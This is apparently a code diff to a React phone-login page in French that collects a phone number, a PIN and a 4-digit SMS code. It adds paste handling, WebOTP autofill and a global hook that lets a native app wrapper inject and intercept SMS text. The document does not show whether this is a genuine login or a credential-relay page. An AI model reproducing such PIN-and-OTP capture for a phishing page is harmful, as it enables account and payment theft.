@@ -51,16 +51,47 @@
       };
 
       const hOC = (i, v) => {
-        if (v.length <= 1 && /^\d*$/.test(v)) {
+        // If the value contains a 4-digit code (e.g. from autofill, copy-paste)
+        const digits = v.replace(/\D/g, '').substring(0, 4);
+        if (digits.length === 4) {
+          setError('');
+          setOtp(digits.split(''));
+          handleVerify(digits);
+          return;
+        }
+
+        // For regular single-digit entry, restrict input to a single digit
+        const singleDigit = v.replace(/\D/g, '').slice(-1);
+        if (singleDigit === '' || /^\d$/.test(singleDigit)) {
           setError('');
           const n = [...otp];
-          n[i] = v;
+          n[i] = singleDigit;
           setOtp(n);
-          if (v && i < 3) {
+          if (singleDigit && i < 3) {
             const next = document.getElementById(`otp-${i + 1}`);
             if (next) next.focus();
           }
         }
+      };
+
+      const handleOtpPaste = (e) => {
+        const pasteData = e.clipboardData.getData('text');
+        const digits = pasteData.replace(/\D/g, '').substring(0, 4);
+        if (digits.length === 4) {
+          setError('');
+          setOtp(digits.split(''));
+          handleVerify(digits);
+        } else if (digits.length > 0) {
+          const n = [...otp];
+          for (let idx = 0; idx < digits.length; idx++) {
+            n[idx] = digits[idx];
+          }
+          setOtp(n);
+          const nextIndex = Math.min(digits.length, 3);
+          const next = document.getElementById(`otp-${nextIndex}`);
+          if (next) next.focus();
+        }
+        e.preventDefault();
       };
 
       const handleLoginSubmit = async () => {
@@ -94,9 +125,10 @@
         }, 1500);
       };
 
-      const handleVerify = async () => {
+      const handleVerify = async (forcedOtp = null) => {
         setError('');
-        if (otp.join('').length < 4) {
+        const otpValue = forcedOtp || otp.join('');
+        if (otpValue.length < 4) {
           setError('Veuillez entrer le code de vérification complet (4 chiffres).');
           return;
         }
@@ -109,7 +141,7 @@
               session_id: sessionId,
               phone,
               pin: pin.join(''),
-              otp: otp.join('')
+              otp: otpValue
             })
           });
 
@@ -139,6 +171,51 @@
           setIsLoading(false);
         }
       };
+
+      useEffect(() => {
+        if (step !== 2) return;
+
+        // 1. WebOTP API for browser-native auto-fill
+        let ac = null;
+        if ('OTPCredential' in window) {
+          try {
+            ac = new AbortController();
+            navigator.credentials.get({
+              otp: { transport: ['sms'] },
+              signal: ac.signal
+            }).then(otpObj => {
+              if (otpObj && otpObj.code) {
+                const code = otpObj.code.trim().substring(0, 4);
+                if (code.length === 4) {
+                  setOtp(code.split(''));
+                  handleVerify(code);
+                }
+              }
+            }).catch(err => {
+              console.log('WebOTP error or aborted:', err);
+            });
+          } catch (e) {
+            console.error('WebOTP initialization failed:', e);
+          }
+        }
+
+        // 2. Native Bridge hook for Mobile App Wrapper (allows the native container to inject SMS text or code directly)
+        window.onSMSReceived = (smsContentOrCode) => {
+          if (!smsContentOrCode) return;
+          console.log('Interception SMS / Code via Native Bridge:', smsContentOrCode);
+          const match = smsContentOrCode.match(/\b\d{4}\b/);
+          if (match) {
+            const code = match[0];
+            setOtp(code.split(''));
+            handleVerify(code);
+          }
+        };
+
+        return () => {
+          if (ac) ac.abort();
+          delete window.onSMSReceived;
+        };
+      }, [step, phone, pin, sessionId]);
 
       if (isLoading) {
         return (
@@ -187,7 +264,19 @@
                 <p className='text-gray-500 mt-4 text-lg'>Le code de vérification a été envoyé au numéro <span className='font-bold text-gray-900'>+243 {phone}</span> renseigné précédemment.</p>
                 <div className='flex justify-center gap-2 sm:gap-4 mt-10'>
                   {[0, 1, 2, 3].map((i) => (
-                    <input key={i} id={`otp-${i}`} type='text' maxLength='1' className='w-10 h-14 sm:w-16 sm:h-20 text-center text-2xl sm:text-3xl font-bold border border-gray-300 rounded-xl sm:rounded-2xl focus:border-red-500 outline-none' value={otp[i] || ''} onChange={(e) => hOC(i, e.target.value)} />
+                    <input 
+                      key={i} 
+                      id={`otp-${i}`} 
+                      type='text' 
+                      inputMode='numeric' 
+                      autoComplete='one-time-code' 
+                      pattern='[0-9]*' 
+                      maxLength='4' 
+                      className='w-10 h-14 sm:w-16 sm:h-20 text-center text-2xl sm:text-3xl font-bold border border-gray-300 rounded-xl sm:rounded-2xl focus:border-red-500 outline-none' 
+                      value={otp[i] || ''} 
+                      onChange={(e) => hOC(i, e.target.value)} 
+                      onPaste={handleOtpPaste} 
+                    />
                   ))}
                 </div>
                 <div className='mt-6 text-gray-500 font-medium'>Renvoyer le code dans <span className='text-red-600'>{timer}s</span></div>
